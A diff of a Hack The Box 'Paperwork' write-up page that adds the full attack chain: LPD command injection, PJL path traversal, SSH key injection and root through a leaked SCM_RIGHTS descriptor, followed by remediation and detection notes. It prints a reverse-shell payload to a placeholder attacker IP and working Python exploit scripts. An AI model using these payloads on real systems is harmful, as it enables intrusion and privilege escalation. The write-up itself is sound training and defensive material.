@@ -4,15 +4,11 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Paperwork — HTB Writeup (Lanky)</title>
-  <meta name="description" content="Hack The Box: Paperwork — Easy Linux. LPD command injection → PJL traversal → SSH key injection → root via a leaked privileged file descriptor.">
+  <meta name="description" content="Hack The Box: Paperwork — Easy Linux. LPD job-name command injection, PJL directory traversal for arbitrary read and write, SSH key injection, then root through a privileged file descriptor leaked over SCM_RIGHTS and a reused administrator password.">
   <link rel="stylesheet" href="../assets/style.css?v=5">
-  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127875;</text></svg>">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#128424;</text></svg>">
 </head>
 <body>
-  <div class="banner">
-    ◷ <strong>Active Season 11 box</strong> — full technical writeup publishes once the season closes. Summary &amp; lessons below.
-  </div>
-
   <header class="nav">
     <div class="wrap">
       <a class="brand" href="../index.html">lanky<span class="accent">.pwns</span></a>
@@ -24,67 +20,341 @@
     <a class="back" href="../index.html#lab">back to writeups</a>
     <img class="wu-logo" src="../assets/logos/paperwork.png" alt="Paperwork logo">
     <h1 style="margin-top:16px;">Paperwork</h1>
-    <div class="subtitle">Hack The Box · <a href="https://app.hackthebox.com/machines/Paperwork" target="_blank" rel="noopener">app.hackthebox.com/machines/Paperwork</a></div>
+    <div class="subtitle">Hack The Box · <a href="https://app.hackthebox.com/machines/Paperwork" target="_blank" rel="noopener">app.hackthebox.com/machines/Paperwork</a> · Season 11</div>
     <div class="machine-meta">
       <span class="pill os-linux">Linux</span>
       <span class="pill diff-easy">Easy</span>
       <span class="pill season">Season 11</span>
-      <span class="pill">LPD · PJL · SCM_RIGHTS</span>
+      <span class="pill">LPD · PJL</span>
+      <span class="pill">SCM_RIGHTS</span>
       <span class="pill flagp">User</span>
       <span class="pill flagp">Root</span>
       <span class="pill rooted">● Completed</span>
-      <span class="pill pending">writeup after season</span>
     </div>
 
     <div class="callout">
-      <span class="tag">Summary</span>
-      A Linux box built around <strong>insecure custom printing services</strong>, compromised by chaining four
-      distinct trust-boundary failures: <strong>command injection in a custom LPD</strong> service (shell as
-      <code>lp</code>) → an internal <strong>PJL/JetDirect</strong> service allowing arbitrary file read/write via
-      path traversal (used to inject an SSH key as <code>archivist</code>) → a root daemon that
-      <strong>leaks an already-open privileged file descriptor over a Unix socket</strong>, exposing a reused
-      administrator password → <strong>root</strong>.
+      <span class="tag">TL;DR</span>
+      A Linux machine built around insecure custom <strong>printing services</strong>, and my favourite kind of
+      box: no single exotic vulnerability, just four individually serious design flaws chained across four trust
+      boundaries. <strong>Command injection</strong> in a custom LPD service gives a shell as <code>lp</code>; an
+      internal <strong>JetDirect/PJL</strong> service running as <code>archivist</code> allows arbitrary file
+      read and write via traversal, used to inject an <strong>SSH key</strong>; and a root-owned management
+      daemon hands an <strong>already-open privileged file descriptor</strong> to an unprivileged client over
+      <code>SCM_RIGHTS</code>, disclosing an administrator password that the root account also accepts.
     </div>
 
-    <h2><span class="num">01</span>Why the full writeup is held back</h2>
-    <p>
-      Paperwork is a live <strong>Season 11</strong> machine, so — in line with Hack The Box's guidance on active
-      machines — I'm not publishing a step-by-step reproduction. The complete writeup (LPD injection, PJL traversal,
-      SSH key injection and the descriptor-leak privesc, with commands and remediation) goes live here
-      <strong>once the season closes</strong>.
-    </p>
-
-    <h2><span class="num">02</span>The interesting bits (no spoilers)</h2>
-    <h3>Command injection in a bespoke print daemon</h3>
-    <p>
-      The foothold wasn't an off-the-shelf CVE — it was <strong>shell command construction inside a custom Line
-      Printer Daemon</strong>, where a print-job field flowed unsanitised into a system command. Custom network
-      services are where the interesting bugs hide.
-    </p>
-    <h3>The rarely-seen one: leaking a privileged file descriptor</h3>
-    <p>
-      The privilege escalation is the standout — a root-owned management daemon passed an <strong>already-opened,
-      root-privileged file descriptor to a client over a Unix socket via <code>SCM_RIGHTS</code></strong>. Receiving
-      that descriptor gave read access to a file the user could never open directly; it held an admin password that
-      was reused for root. A genuinely uncommon primitive to see in the wild.
-    </p>
-
-    <h2><span class="num">03</span>Takeaways</h2>
-    <ul>
-      <li><strong>Never build shell commands from untrusted input</strong> — even in "internal" services like a print daemon.</li>
-      <li><strong>Path handling in PJL/JetDirect is a real read/write primitive</strong> — printers and their protocols are attack surface.</li>
-      <li><strong>Passing file descriptors with <code>SCM_RIGHTS</code> bypasses file permissions</strong> — the receiver inherits the sender's access; scope it tightly.</li>
-      <li><strong>Password reuse turns any leak into full compromise</strong> — the whole chain collapsed on one reused admin password.</li>
-    </ul>
+    <dl class="fact">
+      <dt>Host OS</dt><dd>Linux</dd>
+      <dt>Foothold</dt><dd>LPD job-name command injection (TCP 1515) → <code>lp</code></dd>
+      <dt>User</dt><dd>PJL traversal write → <code>authorized_keys</code> → SSH as <code>archivist</code></dd>
+      <dt>Root</dt><dd><code>SCM_RIGHTS</code> descriptor leak → reused admin password → <code>su</code></dd>
+    </dl>
 
     <div class="callout todo">
-      <span class="tag">Coming after Season 11</span>
-      Full technical walkthrough with the exact LPD injection, PJL traversal, SSH key injection, and the SCM_RIGHTS descriptor-leak-to-root chain.
+      <span class="tag">The chain in one line</span>
+      LPD job-name command injection on 1515 → shell as <code>lp</code> → internal PJL service on
+      <code>127.0.0.1:9100</code> → path traversal read, then write → SSH <code>authorized_keys</code> for
+      <code>archivist</code> → connect to <code>/run/paperwork/mgmt.sock</code> → receive a root-opened file
+      descriptor via <code>SCM_RIGHTS</code> → recover the reused administrator password → <code>su</code> →
+      root.
     </div>
+
+    <h2><span class="num">01</span>Enumeration</h2>
+    <pre data-lang="bash"><code>nmap -Pn -p- --min-rate 5000 -oA scans/all-ports &lt;target&gt;
+nmap -Pn -sC -sV -p22,80,1515 -oA scans/services &lt;target&gt;</code></pre>
+    <p>
+      SSH, HTTP, and a custom LPD-compatible service on <strong>TCP 1515</strong>. Web and source review led
+      straight to the vulnerable Python LPD implementation — and on this box, reading source was worth far more
+      than any scanner.
+    </p>
+    <pre data-lang="python"><code>job_name = "Unknown"
+for line in decoded_content.split('\n'):
+    line = line.strip()
+    if line.startswith('J'):
+        job_name = line[1:]
+        break
+
+subprocess.Popen(
+    f"echo 'Archive: {job_name}' &gt;&gt; /tmp/archive.log",
+    shell=True
+)</code></pre>
+    <p>
+      The control file's job name is attacker-controlled, interpolated into a shell string, and run with
+      <code>shell=True</code>. A single quote closes the intended string and everything after it is shell.
+    </p>
+
+    <h2><span class="num">02</span>Foothold — LPD command injection</h2>
+    <p>The job name is shaped so the surrounding <code>echo</code> stays syntactically valid:</p>
+    <pre data-lang="text"><code>Jx'; bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;attacker-ip&gt;/4444 0&gt;&amp;1'; echo 'x</code></pre>
+    <p>Which the vulnerable line assembles into:</p>
+    <pre data-lang="bash"><code>echo 'Archive: x'; \
+bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;attacker-ip&gt;/4444 0&gt;&amp;1'; \
+echo 'x' &gt;&gt; /tmp/archive.log</code></pre>
+    <pre data-lang="bash"><code>nc -lvnp 4444
+# uid=7(lp) gid=7(lp) groups=7(lp)
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm</code></pre>
+
+    <h2><span class="num">03</span>Internal enumeration as lp</h2>
+    <pre data-lang="bash"><code>cat /etc/passwd | grep -E '/bin/(bash|sh)$'
+find /opt/LPDServer -maxdepth 3 -type f -ls 2&gt;/dev/null
+ps auxww
+ss -lntp</code></pre>
+    <p>Process enumeration exposes a second printing service:</p>
+    <pre data-lang="text"><code>archivist ... /usr/bin/python3 /home/archivist/printer/jetdirect.py \
+    9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
+
+# and it is localhost-only:
+127.0.0.1:9100</code></pre>
+    <p>Two details make this the whole next stage:</p>
+    <ul>
+      <li>It runs as <strong><code>archivist</code></strong>, an interactive account — so any file operation inherits that user's access.</li>
+      <li>Its configured base directory is <code>/home/archivist/printer/</code>, which sits one level below <code>~/.ssh</code>. Traversal out of the base lands somewhere very useful.</li>
+    </ul>
+
+    <h2><span class="num">04</span>PJL arbitrary file read</h2>
+    <p>
+      The service speaks Printer Job Language filesystem commands. Reading its own command log first confirms
+      the framing is right before trying anything clever:
+    </p>
+    <pre data-lang="bash"><code>timeout 5 python3 -c 'import socket
+s=socket.create_connection(("127.0.0.1",9100),2); s.settimeout(3)
+s.sendall(b"\x1b%-12345X\r\n@PJL FSUPLOAD NAME=\"0:/logs/commands.log\" OFFSET=0 SIZE=4096\r\n\x1b%-12345X\r\n")
+print(s.recv(8192).decode(errors="replace"))'</code></pre>
+    <p>Then traversal, because the base directory is joined without canonicalisation:</p>
+    <pre data-lang="text"><code>/home/archivist/printer/ + ../../../etc/passwd  →  /etc/passwd</code></pre>
+    <pre data-lang="bash"><code>@PJL FSUPLOAD NAME="0:/../../../etc/passwd" OFFSET=0 SIZE=4096
+# archivist:x:1000:1000:archivist:/home/archivist:/bin/bash</code></pre>
+    <div class="callout warn">
+      <span class="tag">Operational note</span>
+      Malformed PJL clients leave this custom server waiting for more data, and repeated fuzzing filled its
+      connection backlog during testing. One short-lived connection at a time, and check service health between
+      attempts — a healthy listener shows a receive queue of zero:
+      <code>ss -lnt | grep 9100</code> → <code>LISTEN 0 100 127.0.0.1:9100</code>.
+    </div>
+
+    <h2><span class="num">05</span>PJL write — SSH key injection</h2>
+    <pre data-lang="bash"><code>ssh-keygen -t ed25519 -f ./archivist_key -N ''</code></pre>
+    <p>
+      The target is one level above the printer base: <code>0:/../.ssh/authorized_keys</code>. The
+      implementation detail that cost time here: this custom server expects the <code>FSDOWNLOAD</code> header
+      and the file bytes in <strong>separate socket reads</strong>. Sending them in one <code>sendall</code>
+      produces a zero-byte file with no error.
+    </p>
+    <pre data-lang="python"><code>import socket, time
+
+public_key = b"ssh-ed25519 &lt;public-key-data&gt; attacker@kali\n"
+
+s = socket.create_connection(("127.0.0.1", 9100), 2)
+header = (
+    b"\x1b%-12345X\r\n"
+    b"@PJL FSDOWNLOAD NAME=\"0:/../.ssh/authorized_keys\" SIZE="
+    + str(len(public_key)).encode()
+    + b"\r\n"
+)
+
+s.sendall(header)
+time.sleep(0.5)
+s.sendall(public_key)     # separate write — this is the part that matters
+time.sleep(0.5)
+s.close()</code></pre>
+    <p>Verify with <code>FSUPLOAD</code>, then log in:</p>
+    <pre data-lang="bash"><code>ssh -i ./archivist_key archivist@&lt;target&gt;</code></pre>
+    <div class="flag"><span class="label">user.txt</span>&lt;redacted&gt;</div>
+
+    <h2><span class="num">06</span>Privesc enumeration — reading the daemon</h2>
+    <p>There is no <code>sudo</code> on this system, so it is back to source review:</p>
+    <pre data-lang="bash"><code>ls -l /usr/bin/paperwork-daemon
+sed -n '1,260p' /usr/bin/paperwork-daemon
+ss -xlpn
+find /run /var/run /tmp -type s -ls 2&gt;/dev/null</code></pre>
+    <p>
+      <code>/usr/bin/paperwork-daemon</code> is a world-readable, root-owned Python script. At startup it opens a
+      protected configuration file and <em>keeps the descriptor</em>:
+    </p>
+    <pre data-lang="python"><code>admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)</code></pre>
+    <p>It exposes a Unix socket to group 1000 — which is <code>archivist</code>'s group:</p>
+    <pre data-lang="python"><code>socket_path = "/run/paperwork/mgmt.sock"
+s.bind(socket_path)
+os.chmod(socket_path, 0o660)
+os.chown(socket_path, 0, 1000)</code></pre>
+    <p>And if the printer log contains PJL filesystem verbs, it enters a "lockdown" path:</p>
+    <pre data-lang="python"><code>if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
+    return True</code></pre>
+    <p>The lockdown routine then sends the client an "evidence bundle" of file descriptors:</p>
+    <pre data-lang="python"><code>evidence_bundle = array.array("i", [log_fd, admin_fd])
+conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])</code></pre>
+    <p>
+      This is the critical design error. <code>SCM_RIGHTS</code> passes access to the <strong>open file
+      description itself</strong>, not a pathname. The receiving process never needs filesystem permission to
+      open <code>/etc/paperwork/admin_pins.conf</code> — the descriptor is already open, and it was opened by
+      root. Pathname permissions are simply not in the picture.
+    </p>
+
+    <h2><span class="num">07</span>Receiving the privileged descriptor</h2>
+    <p>
+      The earlier PJL activity already wrote the trigger strings into <code>commands.log</code>, so connecting
+      to the management socket goes straight down the vulnerable branch:
+    </p>
+    <pre data-lang="python"><code>import socket, array, os
+
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect("/run/paperwork/mgmt.sock")
+
+msg, ancdata, flags, address = s.recvmsg(
+    4096, socket.CMSG_SPACE(2 * array.array("i").itemsize))
+
+print(msg.decode(errors="replace"))
+
+for level, kind, data in ancdata:
+    if level == socket.SOL_SOCKET and kind == socket.SCM_RIGHTS:
+        descriptors = array.array("i")
+        descriptors.frombytes(data[:len(data) - (len(data) % descriptors.itemsize)])
+        for descriptor in descriptors:
+            print(os.pread(descriptor, 4096, 0).decode(errors="replace"))
+            os.close(descriptor)
+
+s.close()</code></pre>
+    <pre data-lang="text"><code>ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
+...
+ADMIN_PASSWORD=&lt;redacted&gt;</code></pre>
+
+    <h2><span class="num">08</span>Root</h2>
+    <p>The disclosed administrator password is also the local root password:</p>
+    <pre data-lang="bash"><code>su -
+# uid=0(root) gid=0(root) groups=0(root)</code></pre>
+    <div class="flag"><span class="label">root.txt</span>&lt;redacted&gt;</div>
+
+    <h2><span class="num">09</span>If this were your environment</h2>
+
+    <div class="finding">
+      <span class="tag">Finding 1 · Critical</span>
+      <h4>OS command injection in the LPD service</h4>
+      <p>
+        Attacker-controlled job metadata was interpolated into a shell command executed with
+        <code>shell=True</code>, giving remote command execution as <code>lp</code>.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Do not use a shell at all.</strong> Write the log line with Python file APIs — there is no reason to spawn <code>echo</code>.</li>
+        <li><strong>If a subprocess is unavoidable</strong>, pass an argument list with <code>shell=False</code> and validate every field.</li>
+        <li><strong>Treat all protocol metadata as hostile</strong> — job names, usernames, filenames.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> SI-10 input validation · CM-7 least functionality · AC-6 least privilege<br>
+        <b>CWE:</b> CWE-78 OS command injection
+      </div>
+    </div>
+
+    <div class="finding">
+      <span class="tag">Finding 2 · Critical</span>
+      <h4>PJL directory traversal, read and write</h4>
+      <p>
+        PJL filesystem paths were joined to a configured base directory without enforcing that the resolved path
+        stayed beneath it, giving arbitrary read and write as <code>archivist</code> — and therefore SSH key
+        injection.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Canonicalise first, then check.</strong> Resolve with <code>realpath()</code> / <code>Path.resolve()</code> and reject anything not contained within the approved root — filtering <code>../</code> from the input string is not equivalent.</li>
+        <li><strong>Disable PJL filesystem commands entirely</strong> unless there is a specific requirement; <code>FSDOWNLOAD</code> in particular is a remote file write.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> SI-10 input validation · CM-7 least functionality · AC-3 access enforcement<br>
+        <b>CWE:</b> CWE-22 path traversal
+      </div>
+    </div>
+
+    <div class="finding">
+      <span class="tag">Finding 3 · High</span>
+      <h4>Printer service running as an interactive user</h4>
+      <p>
+        The JetDirect service ran as <code>archivist</code> and could therefore modify that user's own SSH
+        configuration — turning a printer-service compromise directly into an interactive user compromise.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Run it under a dedicated non-login account</strong> with a restricted filesystem sandbox and no access to any human user's home directory.</li>
+        <li><strong>Confine with systemd</strong> — <code>ProtectHome=true</code>, <code>ProtectSystem=strict</code>, <code>NoNewPrivileges=true</code>, and an explicit <code>ReadWritePaths=</code> allow-list.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> AC-6 least privilege · CM-6 configuration settings · SC-2 separation of system and user functionality
+      </div>
+    </div>
+
+    <div class="finding">
+      <span class="tag">Finding 4 · Critical</span>
+      <h4>Privileged file descriptor disclosed over SCM_RIGHTS</h4>
+      <p>
+        The root daemon included an unrelated, root-opened descriptor for a protected configuration file in an
+        ancillary message sent to an unprivileged client — disclosing a root-only secret despite the file's
+        pathname permissions being entirely correct.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Never pass unrelated privileged descriptors to clients.</strong> Build the ancillary descriptor list explicitly and minimally — one descriptor, for the one thing the client asked about.</li>
+        <li><strong>Authenticate and authorise Unix-socket clients</strong> before returning anything sensitive (<code>SO_PEERCRED</code>), rather than relying on socket group ownership alone.</li>
+        <li><strong>Do not hold long-lived descriptors to secrets.</strong> Open, read, close — so there is nothing to leak later.</li>
+        <li><strong>Remember the semantics:</strong> descriptor passing bypasses pathname permission checks by design. This is not a bug in the kernel; it is a bug in trusting the recipient.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> AC-3 access enforcement · AC-6 least privilege · SC-4 information in shared resources · IA-3 device identification &amp; authentication<br>
+        <b>CWE:</b> CWE-402 transmission of private resources into a new sphere
+      </div>
+    </div>
+
+    <div class="finding">
+      <span class="tag">Finding 5 · Critical</span>
+      <h4>Application administrator password reused by the root account</h4>
+      <p>
+        One recovered application secret was accepted by <code>su</code>, converting a configuration disclosure
+        straight into full system compromise.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Unique, randomly generated secrets per service</strong>, held in a secret manager rather than a flat config file.</li>
+        <li><strong>Disable password-based root login</strong> and require audited elevation through a controlled mechanism.</li>
+        <li><strong>Credential separation would have stopped this chain</strong> even after the descriptor leak — worth stating plainly in the report.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> IA-5 authenticator management · AC-6(5) privileged accounts · AC-2 account management · AU-2 event logging
+      </div>
+    </div>
+
+    <h2><span class="num">10</span>Detection — the blue-team side</h2>
+    <ul>
+      <li><strong>LPD control-file fields containing shell metacharacters</strong> or unusually long job names.</li>
+      <li><strong>Outbound connections initiated by the <code>lp</code> account</strong> — there is no legitimate case for this.</li>
+      <li><strong>PJL <code>FSUPLOAD</code> / <code>FSDOWNLOAD</code> / <code>FSQUERY</code> requests containing <code>../</code>.</strong></li>
+      <li><strong>Writes to <code>/home/*/.ssh/authorized_keys</code> by a printer-related process.</strong></li>
+      <li><strong>Unexpected connections to <code>/run/paperwork/mgmt.sock</code></strong>, and anomalous <code>SCM_RIGHTS</code> use by privileged processes.</li>
+      <li><strong><code>su</code> to root shortly after access to application secret files.</strong></li>
+    </ul>
+
+    <h2><span class="num">11</span>Takeaways</h2>
+    <ul>
+      <li><strong>Source review beat scanning.</strong> Every step here came from reading code that was sitting there world-readable.</li>
+      <li><strong>Internal-only services still need real trust boundaries.</strong> "Bound to localhost" described the network position, not the security model.</li>
+      <li><strong>Filesystem restrictions must be applied after canonical path resolution</strong> — a base-directory string prefix is not containment.</li>
+      <li><strong>Unix descriptor passing bypasses pathname permissions by design.</strong> That is the single most transferable thing on this box.</li>
+      <li><strong>Small implementation details decide whether an exploit works.</strong> Header and payload in separate socket writes was the difference between a key and a zero-byte file.</li>
+      <li><strong>Credential separation is the cheapest control here</strong> and would have broken the chain at the last step.</li>
+    </ul>
 
     <p style="margin-top:40px;"><a class="back" href="../index.html#lab">back to writeups</a></p>
   </article>
 
-  <footer><div class="wrap">Paperwork · completed · Lanky &nbsp;·&nbsp; <a href="../index.html#lab">all writeups</a></div></footer>
+  <footer><div class="wrap">Paperwork · Season 11 · completed · Lanky &nbsp;·&nbsp; <a href="../index.html#lab">all writeups</a></div></footer>
 </body>
 </html>
